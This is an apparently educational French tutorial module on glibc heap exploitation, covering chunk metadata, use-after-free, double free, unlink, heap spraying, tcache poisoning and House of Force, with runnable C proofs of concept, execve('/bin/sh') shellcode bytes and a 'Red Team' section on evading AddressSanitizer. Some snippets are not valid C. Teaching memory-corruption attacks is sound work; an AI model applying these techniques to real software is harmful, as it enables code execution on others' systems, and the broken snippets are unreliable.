# Module 30 : Heap Exploitation

## 🎯 Ce que tu vas apprendre

- Comment fonctionne l'allocateur de mémoire dynamique (malloc/free)
- Structure interne des chunks du heap
- Les vulnérabilités classiques du heap (Use-After-Free, Double Free)
- Techniques d'exploitation avancées (Heap Spraying, Unlink)
- Comment exploiter les métadonnées pour corrompre la mémoire
- Applications Red Team : exploitation post-corruption

## 📚 Théorie

### Concept 1 : C'est quoi le Heap ?

**C'est quoi ?**
Le Heap (tas) est une zone de mémoire pour l'allocation dynamique. Contrairement à la Stack (pile) qui gère automatiquement les variables locales, le Heap te permet d'allouer de la mémoire à la demande avec `malloc()`, `calloc()`, `realloc()` et de la libérer avec `free()`.

**Pourquoi ça existe ?**
- La Stack est limitée en taille (~8 MB par défaut)
- La Stack ne peut stocker que des variables locales (durée de vie limitée à la fonction)
- Le Heap permet d'allouer de grandes quantités de mémoire
- Le Heap permet de garder des données vivantes au-delà d'une fonction

**Comment ça marche ?**
```c
// Allocation sur le heap
int *ptr = malloc(100 * sizeof(int));  // 400 bytes alloués
if (ptr == NULL) {
    // Échec d'allocation
}
// Utilisation
ptr[0] = 42;
// Libération
free(ptr);
ptr = NULL;  // Bonne pratique
```

Le système d'exploitation maintient un **allocateur** (heap manager) qui gère cette mémoire.

### Concept 2 : Architecture interne du Heap

**C'est quoi ?**
L'allocateur (glibc malloc, jemalloc, tcmalloc) gère le heap avec des **chunks** (blocs de mémoire). Chaque chunk contient :
1. **Métadonnées** (header) : infos sur la taille, état
2. **User Data** : la mémoire que tu utilises
3. **Pointeurs** (si libre) : pour lier les chunks libres

**Pourquoi ces métadonnées ?**
L'allocateur doit savoir :
- Quelle est la taille de chaque bloc
- Si un bloc est libre ou utilisé
- Où sont les blocs libres pour réutilisation

**Structure typique d'un chunk (glibc malloc)** :

```
CHUNK ALLOUÉ (malloc retourne user_data)
┌────────────────────────────────┐
│  prev_size (8 bytes)           │  ← Taille du chunk précédent (si libre)
├────────────────────────────────┤
│  size | flags (8 bytes)        │  ← Taille de CE chunk + 3 flags
│  ├─ P : chunk précédent utilisé│     (bit 0: P, bit 1: M, bit 2: N)
│  ├─ M : mmap alloué            │
│  └─ N : non-main arena         │
├────────────────────────────────┤ ← malloc() retourne ICI
│  USER DATA                     │
│  (ce que vous utilisez)        │
│  ...                           │
│                                │
└────────────────────────────────┘

CHUNK LIBRE (dans freelist)
┌────────────────────────────────┐
│  prev_size (8 bytes)           │
├────────────────────────────────┤
│  size | flags (8 bytes)        │
├────────────────────────────────┤
│  FD (forward pointer)          │  ← Pointe vers le prochain chunk libre
├────────────────────────────────┤
│  BK (backward pointer)         │  ← Pointe vers le chunk libre précédent
├────────────────────────────────┤
│  Espace inutilisé              │
└────────────────────────────────┘
```

**Les bins (listes de chunks libres)** :

```
L'allocateur organise les chunks libres dans des "bins" :

Fast Bins (10-80 bytes) : LIFO, pas de coalescence
┌─────┐    ┌─────┐    ┌─────┐
│ 16B │ ─> │ 16B │ ─> │ 16B │ ─> NULL
└─────┘    └─────┘    └─────┘

Small Bins (< 512 bytes) : FIFO, doublement chaînés
┌─────┐ <──> ┌─────┐ <──> ┌─────┐
│ 64B │      │ 64B │      │ 64B │
└─────┘      └─────┘      └─────┘

Large Bins (>= 512 bytes) : Triés par taille
┌──────┐ <──> ┌──────┐ <──> ┌──────┐
│ 1024 │      │ 2048 │      │ 4096 │
└──────┘      └──────┘      └──────┘

Unsorted Bin : Cache temporaire après free()
```

### Concept 3 : Vulnérabilités classiques du Heap

**1. Use-After-Free (UAF)**

**C'est quoi ?**
Utiliser un pointeur après avoir appelé `free()` dessus.

**Pourquoi c'est dangereux ?**
La mémoire libérée peut être réallouée à un autre usage. Tu lis/écris alors dans des données que tu ne contrôles plus.

```c
char *ptr = malloc(100);
strcpy(ptr, "secret");
free(ptr);  // Mémoire libérée

// Danger : ptr pointe toujours vers la mémoire
printf("%s", ptr);  // ❌ Use-After-Free (lecture)
strcpy(ptr, "pwn");  // ❌ Use-After-Free (écriture)
```

**Scénario d'exploitation** :

```
1. Allocation A (objet sensible)
   ┌──────────────┐
   │ Objet A      │  malloc(100)
   │ vtable ptr   │
   └──────────────┘

2. Free A
   ┌──────────────┐
   │ LIBRE        │  free(A)
   └──────────────┘

3. Allocation B (contrôlé par attaquant)
   ┌──────────────┐
   │ Objet B      │  malloc(100) réutilise la même zone
   │ fake_vtable  │
   └──────────────┘

4. Use-After-Free sur A
   A->vtable()  // Appelle fake_vtable de B → Code arbitraire
```

**2. Double Free**

**C'est quoi ?**
Appeler `free()` deux fois sur le même pointeur.

**Pourquoi c'est dangereux ?**
Corrompt les métadonnées du heap et les listes de chunks libres.

```c
char *ptr = malloc(100);
free(ptr);
free(ptr);  // ❌ Double Free
```

**Ce qui se passe** :

```
1. État initial
   ┌─────┐
   │ PTR │  malloc(100)
   └─────┘

2. Premier free(ptr)
   Fast Bin [100]:  PTR -> NULL

3. Deuxième free(ptr)
   Fast Bin [100]:  PTR -> PTR -> ???
   ↑ Liste circulaire corrompue

4. Exploitation
   a1 = malloc(100)  // Retourne PTR
   a2 = malloc(100)  // Retourne PTR (même adresse!)

   ┌─────┐
   │ a1  │ ──┐
   └─────┘   │  Même
   ┌─────┐   │  zone
   │ a2  │ ──┘  mémoire
   └─────┘

   strcpy(a1, "AAAA");
   strcpy(a2, "BBBB");  // Écrase a1
```

**3. Heap Overflow**

**C'est quoi ?**
Déborder d'un chunk pour écraser les métadonnées du chunk suivant.

```c
char *a = malloc(100);
char *b = malloc(100);

// Overflow de a vers b
strcpy(a, "AAAA"[...128 fois...]);  // ❌ Déborde sur les métadonnées de b
```

**Visualisation** :

```
AVANT overflow :
┌─────────────────┐
│ size: 0x71      │  Chunk A (112 bytes)
├─────────────────┤
│ USER DATA (100) │
└─────────────────┘
┌─────────────────┐
│ size: 0x71      │  Chunk B
├─────────────────┤
│ USER DATA (100) │
└─────────────────┘

APRÈS strcpy(a, 128 'A') :
┌─────────────────┐
│ size: 0x71      │  Chunk A
├─────────────────┤
│ AAAAAAAAAA...   │
│ AAAAAAAAAA...   │  Débordement
└─────────────────┘
┌─────────────────┐
│ size: 0x4141... │  ← Métadonnées CORROMPUES
├─────────────────┤
│ USER DATA       │
└─────────────────┘
```

**4. Heap Metadata Corruption**

**C'est quoi ?**
Modifier directement les métadonnées (size, FD, BK) pour tromper l'allocateur.

**Technique classique : Unlink Exploit**

Quand deux chunks libres adjacents sont fusionnés (coalescence), l'allocateur fait :

```c
// Simplification de l'algorithme unlink
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;  // ← Écriture mémoire 1
    BK->fd = FD;  // ← Écriture mémoire 2
}
```

**Exploitation** :

```
Setup :
┌──────────────┐
│ Chunk A      │  Contrôlé par attaquant
│ fd = target  │
│ bk = shellcode-8 │
└──────────────┘
┌──────────────┐
│ Chunk B      │
└──────────────┘

free(B) déclenche coalescence avec A :
unlink(A)
→ target->bk = shellcode-8
→ (shellcode-8)->fd = target
→ ÉCRITURE ARBITRAIRE : *target = shellcode-8
```

## 🔍 Visualisation : Cycle de vie du Heap

```
1. PROGRAMME DÉMARRE
   ┌────────────────────────────────┐
   │ HEAP (vide au départ)          │
   │ brk = 0x555555756000           │
   └────────────────────────────────┘

2. malloc(100)
   ┌────────────────────────────────┐
   │ ┌──────────────┐               │
   │ │ Chunk 1      │               │
   │ │ size: 0x71   │               │
   │ │ USER: 100B   │               │
   │ └──────────────┘               │
   │ brk augmente                   │
   └────────────────────────────────┘

3. malloc(50) + malloc(200)
   ┌────────────────────────────────┐
   │ ┌──────┐ ┌─────┐ ┌──────────┐ │
   │ │Chunk1│ │Chunk│ │ Chunk 3  │ │
   │ │ 100B │ │ 50B │ │  200B    │ │
   │ └──────┘ └─────┘ └──────────┘ │
   └────────────────────────────────┘

4. free(Chunk2)
   ┌────────────────────────────────┐
   │ ┌──────┐ ┌─────┐ ┌──────────┐ │
   │ │Chunk1│ │FREE │ │ Chunk 3  │ │
   │ │ USED │ │ fd  │ │  USED    │ │
   │ └──────┘ └─────┘ └──────────┘ │
   │           ↓                    │
   │      Fast Bin [50]             │
   └────────────────────────────────┘

5. free(Chunk1) + coalescence
   ┌────────────────────────────────┐
   │ ┌─────────────┐ ┌──────────┐  │
   │ │ FREE (150B) │ │ Chunk 3  │  │
   │ │ coalescé    │ │  USED    │  │
   │ └─────────────┘ └──────────┘  │
   │       ↓                        │
   │  Unsorted Bin                  │
   └────────────────────────────────┘
```

## 💻 Exemple pratique

### Use-After-Free exploitable

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*print)(char*);
} User;

void normal_print(char *name) {
    printf("User: %s\n", name);
}

void admin_print(char *name) {
    printf("[ADMIN] %s - Shell granted!\n", name);
    system("/bin/sh");  // Fonction privilégiée
}

int main() {
    // 1. Allocation utilisateur normal
    User *user1 = malloc(sizeof(User));
    strcpy(user1->name, "Alice");
    user1->print = normal_print;

    // 2. Utilisation normale
    user1->print(user1->name);  // Output: User: Alice

    // 3. Free mais on garde le pointeur (BUG)
    free(user1);

    // 4. Allocation contrôlée par attaquant
    // Si même taille, réutilise la zone de user1
    User *user2 = malloc(sizeof(User));
    strcpy(user2->name, "Hacker");
    user2->print = admin_print;  // ← Fonction privilégiée

    // 5. Use-After-Free : appel via l'ancien pointeur
    user1->print(user1->name);
    // user1 pointe maintenant vers user2 !
    // → Exécute admin_print → Shell !

    return 0;
}
```

**Compilation et test** :

```bash
gcc -o uaf uaf.c -fno-stack-protector
./uaf

# Output:
# User: Alice
# [ADMIN] Hacker - Shell granted!
# $ whoami
```

### Double Free exploitable

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *a = malloc(100);
    char *b = malloc(100);
    char *c = malloc(100);

    strcpy(a, "Chunk A");
    strcpy(b, "Chunk B");
    strcpy(c, "Chunk C");

    printf("A: %p\n", a);
    printf("B: %p\n", b);
    printf("C: %p\n", c);

    // Double Free sur A
    free(a);
    free(b);  // Évite la détection fast bin dup
    free(a);  // ❌ DOUBLE FREE

    // État actuel Fast Bin [100]: A -> B -> A -> ???

    // Exploitation : obtenir 2 pointeurs vers la même zone
    char *x = malloc(100);  // Retourne A
    char *y = malloc(100);  // Retourne B
    char *z = malloc(100);  // Retourne A (même que x!)

    printf("\nAprès exploitation:\n");
    printf("X: %p\n", x);
    printf("Y: %p\n", y);
    printf("Z: %p\n", z);  // Z == X

    // Preuve : modifier z change x
    strcpy(z, "PWNED");
    printf("X contient: %s\n", x);  // Output: PWNED

    return 0;
}
```

**Résultat** :

```
A: 0x55555555a2a0
B: 0x55555555a310
C: 0x55555555a380

Après exploitation:
X: 0x55555555a2a0
Y: 0x55555555a310
Z: 0x55555555a2a0  ← Même que X !
X contient: PWNED
```

### Heap Spraying pour fiabilité d'exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode NOP sled + payload
unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"  // NOP sled
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"  // execve("/bin/sh")
    "\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    "\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    "\x3b\x0f\x05";

void heap_spray() {
    printf("[*] Heap Spraying...\n");

    // Allouer 1000 chunks de 4096 bytes
    for (int i = 0; i < 1000; i++) {
        void *chunk = malloc(4096);
        if (chunk) {
            // Remplir avec le shellcode
            for (int j = 0; j < 4096; j += sizeof(shellcode)) {
                memcpy((char*)chunk + j, shellcode, sizeof(shellcode));
            }
        }
    }

    printf("[*] Heap rempli avec shellcode\n");
    printf("[*] Sauter n'importe où dans le heap → shellcode\n");
}

int main() {
    heap_spray();

    // Simulation : saut dans le heap
    // En réalité : exploitation d'une vulnérabilité
    // qui fait sauter EIP/RIP dans le heap

    printf("[*] Heap spray terminé\n");
    return 0;
}
```

## 🎯 Application Red Team

### 1. Exploitation Use-After-Free dans un navigateur

**Scénario** : Vulnérabilité UAF dans le moteur JavaScript

```c
// Code vulnérable (simplifié)
typedef struct {
    char *data;
    void (*callback)(void*);
} JSObject;

JSObject *obj = malloc(sizeof(JSObject));
obj->data = strdup("hello");
obj->callback = normal_function;

// Bug : free sans mettre à NULL
free(obj);

// Attaquant déclenche une allocation de même taille
JSObject *controlled = malloc(sizeof(JSObject));
controlled->callback = shellcode_address;

// Utilisation de l'ancien pointeur
obj->callback(obj->data);  // ← Exécute le shellcode
```

**Exploitation** :
1. Trigger le free() via JavaScript
2. Spray le heap avec des objets contrôlés
3. Trigger l'UAF → Exécution de code

### 2. Heap Feng Shui (manipulation de l'état du heap)

**C'est quoi ?**
Organiser le heap dans un état prévisible avant l'exploitation.

**Technique** :

```
Objectif : Placer chunk A à côté de chunk B

1. Allouer 100 chunks de taille T
   ┌───┬───┬───┬───┬───┐
   │ T │ T │ T │ T │ T │ ...
   └───┴───┴───┴───┴───┘

2. Libérer les chunks pairs
   ┌───┬───┬───┬───┬───┐
   │ T │ F │ T │ F │ T │ ...
   └───┴───┴───┴───┴───┘

3. Allouer chunk A (taille T)
   ┌───┬───┬───┬───┬───┐
   │ T │ A │ T │ F │ T │ ...
   └───┴───┴───┴───┴───┘

4. Allouer chunk B (taille T)
   ┌───┬───┬───┬───┬───┐
   │ T │ A │ T │ B │ T │ ...
   └───┴───┴───┴───┴───┘

5. Overflow A → Corrompt B (adjacent !)
```

### 3. Tcache Poisoning (glibc 2.26+)

**C'est quoi ?**
Les Tcaches (Thread Local Caching) sont des bins par thread pour améliorer les perfs. Moins de protections que les fast bins.

**Exploitation** :

```c
// 1. Remplir tcache avec 7 chunks
for (int i = 0; i < 7; i++) {
    free(malloc(100));
}

// 2. Double free dans tcache (moins protégé)
void *a = malloc(100);
free(a);
free(a);  // Tcache ne vérifie pas les double free

// 3. Tcache poisoning
void *b = malloc(100);
*((unsigned long*)b) = target_address;  // Corrompre tcache->next

void *c = malloc(100);  // Retourne 'a'
void *d = malloc(100);  // Retourne target_address !

// On peut maintenant écrire à target_address
strcpy(d, shellcode);
```

### 4. Exploitation House of Force

**Technique** : Corrompre le top chunk pour contrôler malloc

```c
// 1. Heap overflow pour écraser top chunk size
char *a = malloc(100);
strcpy(a, "A" * 108 + "\xff\xff\xff\xff\xff\xff\xff\xff");
// Top chunk size = 0xffffffffffffffff (énorme)

// 2. malloc géant pour déplacer top chunk
malloc(target_address - current_top - 0x10);

// 3. Prochain malloc retourne target_address
void *evil = malloc(100);  // evil == target_address
```

### 5. Détection et évasion

**Outils de détection** :
- AddressSanitizer (ASAN) : Détecte UAF, double free, heap overflow
- Valgrind : Détecte les memory leaks et accès invalides
- GWP-ASan : ASAN probabiliste en production

**Techniques d'évasion** :

```c
// 1. Éviter ASAN : allouer/libérer rapidement
for (int i = 0; i < 1000; i++) {
    void *ptr = malloc(100);
    free(ptr);
}
// ASAN garde une quarantaine, mais limitée

// 2. Utiliser des allocateurs custom
void *my_malloc(size_t size) {
    return mmap(NULL, size, PROT_READ|PROT_WRITE,
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
}
// Bypass le heap standard et ses protections

// 3. Heap grooming timing
sleep(random());  // Timing aléatoire pour éviter détection déterministe
```

## 📝 Points clés à retenir

- Le heap est géré par un allocateur avec des métadonnées (size, flags, FD/BK)
- Use-After-Free : Utiliser un pointeur après free() → Exécution de code
- Double Free : free() deux fois → Corruption des bins
- Heap Overflow : Déborder un chunk pour corrompre les métadonnées du suivant
- Heap Spraying : Remplir le heap de shellcode pour augmenter la fiabilité
- Unlink exploit : Corrompre FD/BK pour écriture arbitraire
- Tcache poisoning : Moins de protections que fast bins (glibc 2.26+)
- Heap Feng Shui : Manipuler l'état du heap pour exploitation fiable
- Toujours mettre les pointeurs à NULL après free()
- Les protections modernes (ASAN, safe unlinking) rendent l'exploitation plus difficile

## ➡️ Prochaine étape

Maintenant que tu comprends l'exploitation du heap, tu vas apprendre les [Race Conditions](../27_race_conditions/) pour exploiter les programmes multi-threadés.

---

**Exercices** : Voir [exercice.txt](exercice.txt)
**Code exemple** : Voir [example.c](example.c)
